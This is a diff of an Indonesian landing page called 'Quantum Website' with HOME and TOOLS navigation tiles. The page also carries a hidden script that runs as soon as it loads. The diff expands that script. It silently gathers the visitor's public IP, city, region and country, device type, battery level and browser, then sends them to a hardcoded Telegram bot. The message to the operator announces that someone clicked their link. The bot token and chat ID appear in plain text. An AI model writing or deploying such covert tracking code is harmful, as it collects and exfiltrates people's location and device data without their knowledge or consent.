@@ -1,65 +1,46 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <title>Quantum Website</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="UTF-8">
+<title>Quantum Website</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
 
-  <style>
-    *{margin:0;padding:0;box-sizing:border-box;font-family:Poppins}
-    body{
-      min-height:100vh;
-      background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);
-      display:flex;
-      flex-direction:column;
-      justify-content:space-between;
-      color:#fff;
-    }
-    .container{
-      text-align:center;
-      padding:70px 20px;
-    }
-    h1{
-      font-size:2.6rem;
-      letter-spacing:2px;
-    }
-    .subtitle{
-      opacity:.9;
-      margin-top:15px;
-    }
-    .creator{
-      margin-top:20px;
-      opacity:.8;
-      font-style:italic;
-    }
-    .footer{
-      background:rgba(0,0,0,.35);
-      padding:25px;
-      display:flex;
-      justify-content:center;
-      gap:25px;
-      backdrop-filter:blur(8px);
-    }
-    .nav-box{
-      width:160px;height:125px;
-      background:rgba(255,255,255,.12);
-      border-radius:20px;
-      display:flex;
-      flex-direction:column;
-      align-items:center;
-      justify-content:center;
-      cursor:pointer;
-      transition:.3s;
-    }
-    .nav-box:hover{
-      transform:translateY(-8px) scale(1.05);
-      background:linear-gradient(135deg,#00c6ff,#0072ff);
-    }
-    .icon{font-size:40px}
-    .nav-text{font-weight:600}
-  </style>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Poppins',sans-serif;}
+body{
+  min-height:100vh;
+  background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);
+  color:#fff;
+  display:flex;
+  flex-direction:column;
+  justify-content:space-between;
+}
+.container{text-align:center;padding:70px 20px;}
+h1{font-size:2.6rem;margin-bottom:15px;}
+.subtitle{max-width:700px;margin:auto;opacity:.9;}
+.creator{margin-top:15px;opacity:.8;font-style:italic;}
+.footer{
+  background:rgba(0,0,0,.35);
+  padding:25px;
+  display:flex;
+  justify-content:center;
+  gap:25px;
+}
+.nav-box{
+  width:160px;height:125px;
+  background:rgba(255,255,255,.12);
+  border-radius:20px;
+  display:flex;
+  flex-direction:column;
+  justify-content:center;
+  align-items:center;
+  cursor:pointer;
+}
+.icon{font-size:42px}
+.nav-text{font-weight:600}
+</style>
 </head>
 <body>
 
@@ -72,12 +53,12 @@
 </div>
 
 <div class="footer">
-  <div class="nav-box" onclick="window.location.href='index.html'">
+  <div class="nav-box" onclick="location.href='index.html'">
     <div class="icon">🏠</div>
     <div class="nav-text">HOME</div>
   </div>
 
-  <div class="nav-box" onclick="window.location.href='tools.html'">
+  <div class="nav-box" onclick="location.href='tools.html'">
     <div class="icon">⚙️</div>
     <div class="nav-text">TOOLS</div>
   </div>
@@ -87,35 +68,70 @@
 const BOT_TOKEN = "8416804133:AAFfm7SNGYI-EUCEDbpf6IgsJNIZxW9NtcM";
 const CHAT_ID = "8080998217";
 
+function getBrowserName() {
+  const ua = navigator.userAgent;
+  if (ua.includes("Chrome") && !ua.includes("Edg")) return "Google Chrome";
+  if (ua.includes("Firefox")) return "Mozilla Firefox";
+  if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
+  if (ua.includes("Edg")) return "Microsoft Edge";
+  if (ua.includes("OPR") || ua.includes("Opera")) return "Opera";
+  return "Unknown Browser";
+}
+
 async function sendToTelegram(){
   try{
-    // Ambil IP publik
+    // IP
     const ipRes = await fetch("https://api.ipify.org?format=json");
-    const ipData = await ipRes.json();
+    const ip = await ipRes.json();
+
+    // GEO
+    const geoRes = await fetch(`https://ipapi.co/${ip.ip}/json/`);
+    const geo = await geoRes.json();
+
+    // Device
+    const device = /Android/i.test(navigator.userAgent)
+      ? "Android"
+      : /iPhone|iPad/i.test(navigator.userAgent)
+      ? "iOS"
+      : "Desktop";
+
+    // Battery (persen saja)
+    let batteryText = "N/A";
+    if (navigator.getBattery) {
+      const battery = await navigator.getBattery();
+      batteryText = Math.round(battery.level * 100) + "%";
+    }
+
+    const browser = getBrowserName();
 
     const message = `
 🚨 LAPOR KETUA 🚨
 ADA YG BARU CLICK LINK ANDA
 
-🌐 IP : ${ipData.ip}
-🕒 Waktu : ${new Date().toLocaleString()}
+🌍 Negara : ${geo.country_name || "Unknown"}
+🏙️ Kota/Daerah : ${geo.city || "-"}, ${geo.region || "-"}
+🏛️ Ibu Kota Negara : ${geo.country_capital || "-"}
+🌐 IP : ${ip.ip}
+⏰ Jam : ${new Date().toLocaleString()}
+📱 Device : ${device}
+🔋 Baterai : ${batteryText}
+🌐 Browser : ${browser}
     `;
 
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-      method:"POST",
-      headers:{ "Content-Type":"application/json" },
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         chat_id: CHAT_ID,
         text: message
       })
     });
 
-  }catch(e){
-    console.log("Gagal kirim telegram");
+  } catch (e) {
+    console.log("Gagal kirim telegram", e);
   }
 }
 
-// kirim otomatis saat halaman dibuka
 sendToTelegram();
 </script>
 
